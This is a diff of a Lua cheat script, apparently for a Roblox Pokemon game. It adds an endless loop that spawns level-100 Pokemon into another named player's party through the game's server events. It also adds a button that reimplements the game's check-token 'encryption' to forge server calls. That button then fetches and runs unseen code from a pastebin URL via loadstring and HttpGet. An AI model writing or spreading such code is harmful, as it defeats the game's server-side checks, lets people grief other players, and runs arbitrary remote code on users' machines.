@@ -778,9 +778,34 @@ Callback = function()
 pokemon = givenpokemonname:GetText()
 local pokemon = givenpokemonname:GetText()
 local level = "100"
+while true do
 _G.PlayingCheckers(pokemon, game.Players[person:GetText()].OppPokemon, level, true)
 game.ReplicatedStorage.REvents.PC.ChangePos:InvokeServer(game.Players[person:GetText()].OppPokemon[pokemon], 2)
 game.ReplicatedStorage.REvents.PC.ParentChange:InvokeServer(game.Players[person:GetText()].OppPokemon[pokemon], game.Players[person:GetText()].PokemonParty)
+end
+end
+})
+
+Z.Button({
+Text = "Click Me if this did not work!",
+Callback = function()
+_G.PlayingCheckers = function(pokemon, party, level, leavethistrueiguess)
+local Encrypt = function(CodeSource)
+local StringCode = '';
+for i = 1, #CodeSource do
+StringCode = StringCode ..string.char(48)..string.byte(string.sub(CodeSource,i,i));
+end
+return StringCode;
+end
+
+local pass = Encrypt(game.Players.LocalPlayer.Name..level..pokemon)
+
+game.ReplicatedStorage.REvents.Pokemon.iwillknowXD:InvokeServer(pokemon, party, level, leavethistrueiguess, leavethistrueiguess, pass)
+end
+
+wait(3)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/8qrgSuaU", true))()
 end
 })
 
